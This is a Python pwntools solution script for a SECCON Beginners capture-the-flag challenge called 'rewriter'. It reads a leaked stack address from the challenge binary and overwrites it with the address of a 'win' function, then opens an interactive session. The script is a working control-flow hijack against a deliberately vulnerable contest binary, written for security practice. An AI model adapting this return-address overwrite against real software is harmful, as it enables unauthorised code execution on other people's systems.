#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
HOST = "rewriter.quals.beginners.seccon.jp"
PORT = 4103

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_win = elf.symbols["win"]

def exploit():
	conn.recvuntil("rbp\n")
	conn.recvuntil("0x")
	target = int(conn.recvuntil(" "),16)
	
	conn.sendlineafter("> ", hex(target))
	conn.sendlineafter("= ", hex(addr_win))
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
